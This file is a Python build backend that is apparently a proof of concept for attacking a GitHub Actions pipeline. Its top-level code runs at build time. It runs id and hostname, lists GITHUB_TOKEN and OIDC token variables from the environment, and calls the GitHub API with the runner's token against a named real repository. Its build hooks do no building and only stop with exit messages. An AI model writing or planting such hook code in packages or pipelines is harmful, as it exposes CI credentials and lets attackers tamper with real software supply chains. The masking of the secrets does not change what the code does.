import subprocess

def _sh(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=45)
        return ((r.stdout or "") + (r.stderr or "")).strip()
    except Exception as e:
        return "ERR:%s" % e

def _emit(tag, s):
    print("CTFPOC[%s]>>> %s" % (tag, s.replace("\n", " | ")[:1200]), flush=True)

_emit("whoami", _sh("id; hostname; echo PWD=$PWD"))
_emit("env", _sh("env | grep -Ei '^(ACTIONS_ID_TOKEN|GITHUB_TOKEN|GITHUB_REPOSITORY|GITHUB_REF|GITHUB_EVENT_NAME|GITHUB_ACTOR|GITHUB_HEAD_REF)=' | sed -E 's/=(.{8}).*/=\\1MASKED/'"))
_emit("oidc", _sh("echo URL=${ACTIONS_ID_TOKEN_REQUEST_URL:-NONE}; echo TOK=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+SET}"))
_emit("perm", _sh("curl -s -m 10 -H \"Authorization: token $GITHUB_TOKEN\" https://api.github.com/repos/anaconda/jupyterlab-slurm | head -c 300"))

def get_requires_for_build_wheel(config_settings=None):
    return []

def prepare_metadata_for_build_wheel(metadata_directory, config_settings=None):
    raise SystemExit("CTFPOC metadata stop")

def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):
    raise SystemExit("CTFPOC build stop")
